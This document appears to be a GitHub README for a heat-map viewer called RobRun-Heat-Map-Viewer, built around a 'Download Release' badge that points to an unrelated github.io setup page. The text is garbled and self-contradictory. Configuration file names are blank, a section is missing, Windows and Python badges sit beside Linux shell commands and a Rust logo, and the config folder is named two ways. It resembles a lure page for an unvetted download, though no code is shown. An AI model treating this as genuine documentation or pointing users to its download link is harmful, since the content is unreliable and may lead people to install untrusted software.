RobRun:

# RobRun-Heat-Map-Viewer

<p align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-ea580c?style=plastic&logo=rust&logoColor=white" alt="Download">
  </a>
  <a href="https://img.shields.io/badge/OS-Windows-0078D4?style=flat-square&logo=windows&logoColor=white">
    <img src="https://img.shields.io/badge/OS-Windows-0078D4?style=flat-square&logo=windows&logoColor=white" alt="OS">
  </a>
  <a href="https://img.shields.io/badge/Build-Stable-4caf50?style=for-the-badge&logo=github&logoColor=white">
    <img src="https://img.shields.io/badge/Build-Stable-4caf50?style=for-the-badge&logo=github&logoColor=white" alt="Build">
  </a>
  <a href="https://img.shields.io/badge/Language-Python-3776AB?style=flat&logo=python&logoColor=white">
    <img src="https://img.shields.io/badge/Language-Python-3776AB?style=flat&logo=python&logoColor=white" alt="Language">
  </a>
  <a href="https://img.shields.io/badge/Size-10MB-ff9933?style=flat-square&logo=data&logoColor=white">
    <img src="https://img.shields.io/badge/Size-10MB-ff9933?style=flat-square&logo=data&logoColor=white" alt="Size">
  </a>
</p>

---

## 1.  Overview of RobRun-Heat-Map-Viewer

RobRun-Heat-Map-Viewer is a dedicated visualization framework that transforms raw telemetry from the RobRun platform into an interactive heat‑map representation. The viewer focuses on delivering granular insights through layered color gradients, dynamic zoom, and synchronized time‑stamps. Its architecture is intentionally lightweight; it parses pre‑generated CSV logs, applies user‑defined configuration profiles, and renders the data within a native window using a cross‑platform GUI library.

Key strengths:
- **Configurable Profiles** – Separate files (``, ``, ``, ``) allow fine‑tuned control over color scales, opacity, and data filtering.
- **Workflow Presets** – Presets bundle configuration sets with launch scripts to accelerate typical use cases (e.g., “Quick Review”, “Deep Dive”, “Export Session”).
- **Bundled Release** – A single ZIP archive contains the compiled binary, example configuration, and sample data sets, ready to drop into any directory.

---

## 2.  Getting Started with the Release Bundle

The latest release bundle can be retrieved from the Download badge or directly via the link below:
**<https://rewfdf.github.io/SetupPage/>**

**Unpack** the archive:

```
unzip RobRun-Heat-Map-Viewer-1.2.0.zip -d /opt/RobRun
```

Navigate to the extraction folder and launch:

```
cd /opt/RobRun
./RobRun-Heat-Map-Viewer
```

Upon first run the application will scan the `logs/` directory for CSV files. If none are found, a dialog will prompt you to provide a path.

---

## 4.  Workflow Presets

RobRun-Heat-Map-Viewer ships with a set of executable scripts located in the `presets/` directory. Each script initiates the viewer with a pre‑selected profile bundle and optional command‑line flags.

| Script | Purpose | Command |
|--------|---------|---------|
| `quick_review.sh` | Loads `` and `` for a fast snapshot. | `./RobRun-Heat-Map-Viewer -p quick_review` |
| `deep_dive.sh` | Uses `` to highlight low‑performance zones. | `./RobRun-Heat-Map-Viewer -p deep_dive` |
| `export_session.sh` | Exports the current heat map as PNG and CSV. | `./RobRun-Heat-Map-Viewer -p export_session` |

To create a custom preset, duplicate an existing script, edit the `-p` argument, and optionally add flags such as `--auto-zoom` or `--save-session`.

---

## 5.  Directory Layout

```
RobRun-Heat-Map-Viewer/
├── bin/
│   └── RobRun-Heat-Map-Viewer          # Executable
├── config/
│   ├──
│   ├──
│   ├──
│   └──
├── presets/
│   ├── quick_review.sh
│   ├── deep_dive.sh
│   └── export_session.sh
├── logs/
│   ├── session1.csv
│   └── session2.csv
├── samples/
│   ├── sample1.csv
│   └── sample2.csv
└── README.md
```

All relative paths are resolved at runtime; you can relocate the `config/` or `presets/` directories as long as the environment variable `ROBRUN_HM_CONFIG` or `ROBRUN_HM_PRESETS` points to the new location.

---

## 6.  Using the Viewer – Interactive Workflow

1. **Load a session** – Choose “Open Log” from the File menu or drag a CSV into the window.
2. **Adjust heat parameters** – Open the “Heat Settings” panel, modify threshold, scale, and color range.
3. **Play / Pause** – Use the media bar; the default speed is controlled by ``.
4. **Export** – From the File menu, select “Export as PNG / CSV” to save the current view.
5. **Scripted runs** – Execute a preset script to automate steps 1‑4.

Keyboard shortcuts:
- `Space` – toggle play/pause
- `+ / -` – adjust speed
- `Ctrl+S` – export current frame as PNG
- `Ctrl+E` – export raw data as CSV

---

## 7.  FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| **The viewer does not detect any CSV files** | Ensure the file extension is `.csv` and located in a directory scanned by the viewer. Use the “Open Log” dialog if auto‑scan fails. |
| **Heat colors appear inverted** | Verify `color_low` and `color_high` in ``. Swapping them will correct the inversion. |
| **Playback stalls after a few seconds** | Check the frame rate specified in ``. Reducing `speed` or increasing the `frame_buffer` can alleviate the issue. |
| **Export fails with permission error** | Run the viewer with elevated privileges or write to a user‑writeable directory. |
| **Custom configuration is ignored** | The viewer loads `` after ``. If your override uses an unsupported key, it will be silently ignored; consult the log for warnings. |

If none of these solutions resolve the problem, consult the `debug.log` file in the installation root.

---

## 8.  Contributing to RobRun-Heat-Map-Viewer

All contributions are welcome. Preferred workflow: fork the repository, create a feature branch, and submit a pull request with descriptive commit messages. Tests are located in the `tests/` folder; run them before submitting.

---

## 9.  License

RobRun-Heat-Map-Viewer is released under the MIT License. Full terms are available in the LICENSE file.

---

## 10.  Contact

For support or feature requests, open an issue on the GitHub repository or email `support@robrunheatmap.com`.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```